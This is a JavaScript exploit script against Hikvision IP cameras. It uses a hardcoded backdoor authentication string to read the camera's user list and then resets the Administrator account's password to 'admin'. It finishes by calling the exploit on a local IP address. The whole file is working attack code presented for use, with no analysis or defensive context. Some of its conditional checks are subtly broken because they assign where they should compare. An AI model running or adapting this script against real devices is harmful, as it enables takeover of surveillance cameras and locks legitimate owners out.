var errorMessage = 'Could not execute exploit.';
var newPassword = "admin";
var backdoorAuthArg = "auth=YWRtaW46MTEK";

function httpGet(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = false;
    xhr.open("GET", url, true, "admin", "admin");
    xhr.onreadystatechange = (function processRequest(e) {
        if( xhr.readyState == 4 && xhr.status == 200) {
            return callback(xhr.responseText);
        }
        else if(xhr.status >= 400){
            return callback(errorMessage);
        }
    });
    xhr.send();
}

function hikvisionGetUserList(ip, callback) {
    httpGet(ip + "/Security/users?" + backdoorAuthArg, function returned(response){
        if(response != errorMessage) {
            var xmlDoc = (new DOMParser()).parseFromString(response,"text/xml").getElementsByTagName("UserList")[0];
            return callback(xmlDoc);
        }
        return callback(errorMessage);
    });
}

function hikvisionChangeUserPassword(ip, userid, username, password, callback) {
    var userXml = 
    '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\
        <id>' + userid + '</id>\
        <userName>' + username + '</userName>\
        <password>' + password + '</password>\
    </User>';
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(userXml,"text/xml");

    var url = ip + "/Security/users/" + userid + "?" + backdoorAuthArg;
    var xhr = new XMLHttpRequest();
    xhr.open("PUT", url, true);
    xhr.send(userXml);
    xhr.onreadystatechange = (function processRequest(e) {
        if( xhr.readyState == 4 && xhr.status == 200) {
            return callback(xhr.responseText);
        }
        else if(xhr.status >= 400){
            return callback(errorMessage);
        }
    });
    console.log(xmlDoc);
}

function exploit(ip, password) {
    hikvisionGetUserList(ip, function returned(xmlDoc) {
        if(userList != errorMessage) {
            var userList = xmlDoc.getElementsByTagName("User");
            for (i = 0; i < userList.length; i++) {
                var priority = userList[i].getElementsByTagName("priority")[0].innerHTML;
                var id = userList[i].getElementsByTagName("id")[0].innerHTML;
                var userName = userList[i].getElementsByTagName("userName")[0].innerHTML;
                var userLevel = userList[i].getElementsByTagName("userLevel")[0].innerHTML;

                if(priority = "high"){
                    if(userLevel = "Administrator"){
                        hikvisionChangeUserPassword(ip, id, userName, password, function call(response) {
                            console.log(response);
                        });
                        return 1;
                    }
                }
            }
        }
        return errorMessage;
    });
}


exploit("https://192.168.1.203", newPassword);
